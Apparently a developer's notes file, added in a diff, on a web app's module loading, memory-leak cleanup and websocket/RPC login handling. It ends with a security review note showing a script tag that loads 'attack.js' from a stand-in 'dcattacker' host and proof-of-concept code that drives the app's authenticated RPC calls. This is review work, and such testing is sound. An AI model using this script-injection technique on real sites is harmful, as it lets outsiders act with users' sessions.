@@ -1,0 +1,132 @@
+REVIEW
+
+jQuery and leaks
+http://javascript.info/tutorial/memory-leaks
+
+
+
+
+[
+  '//other-domain.com/1.js',
+  '2.js'
+].forEach(function(src) {
+  var script = document.createElement('script');
+  script.src = src;
+  document.head.appendChild(script);
+});
+
+
+function purge(d) {
+    var a = d.attributes, i, l, n;
+    if (a) {
+        for (i = a.length - 1; i >= 0; i -= 1) {
+            n = a[i].name;
+            if (typeof d[n] === 'function') {
+                d[n] = null;
+            }
+        }
+    }
+    a = d.childNodes;
+    if (a) {
+        l = a.length;
+        for (i = 0; i < l; i += 1) {
+            purge(d.childNodes[i]);
+        }
+    }
+}
+
+
+
+ws keepalive
+	- detects if connection is down - show login
+	- detects if session is guest - show login
+	- login is overlay so does not change current page
+
+ws rpc
+	- any time error returns NNNN "user not authorized" - show login
+
+TODO
+	- make font resource local, more secure - but figure out which to use first
+	- develop a cross domain resource sharing policy
+	- support for CORS
+
+
+PER MODULE PAGE
+	REQUIRE
+		- other modules
+		- standard JS libs	(these get bumped up to module level requirements so they are loaded before page is ever loaded)
+		
+	ICONS
+		- list module and name for each icon used
+		
+	FONTS
+		- list module and name for each font used
+		
+	CODE
+		- xml for layout
+	
+	FUNCS
+		- functions for use with layout
+
+PER MODULE DESC
+	REQUIRE
+		- other modules
+		- standard JS libs
+		
+MASTER MODULE DESC
+	- list of all modules
+	- list of all JS libs required by any part of the module
+	- list of major menu options for home page
+
+	- ABOVE all loads as part of initial screen, first page to show is loaded after this so that the page will wait for all external requirements first
+	
+Modules can call modules by first doing a "require" and then a callback is called when the module is avaiable
+
+Modules can be refreshed - send lastmodified in request
+
+when page changes purge (above) entire dom before changing page
+
+
+
+
+
+ISSUES - review
+
+linked in Script from 'dcattacker' domain (nginx in ftc customer, ncc)
+
+	
+<script src="//dcattacker:8080/attack.js"></script>	
+
+
+	console.log('attacker: ' + dc.comm.sendMessage);
+
+	setTimeout(function() {
+		dc.comm.sendMessage({ Service: 'Status', Feature: 'Echo', Op: 'Test', Body: 'hello hub!' }, function(e) {
+			console.log('attacker 2: ' + JSON.stringify(e));
+		});
+	}, 10000);
+
+- completely works, no clue of the attack	
+	
+	
+	setTimeout(function() {
+		jQuery.ajax({ 
+			type: 'POST', 
+			url: '/rpc/?nocache=' + dc.util.Crypto.makeSimpleKey(), 
+			contentType: 'application/json; charset=utf-8',
+			data: JSON.stringify({ Service: 'Status', Feature: 'Echo', Op: 'Test', Body: 'hello again hub!', RespondTag: 'SendWait' }), 
+			processData: false,
+			success: function(rmsg) {
+				console.log('attacker 3: ' + JSON.stringify(rmsg));
+			}, 
+			timeout: 60000,
+			error: function() {
+				console.log('attacker 3: AJAX call failed or timed out.');
+			}
+		});
+	}, 13000);
+
+- also completely works and, in chrome it shows origin of http://up1.nccgroup.com:8088 not of http://dcattacker:8080 - so this is pretty much hopeless.  FF doesn't even send origin.
+
+
+
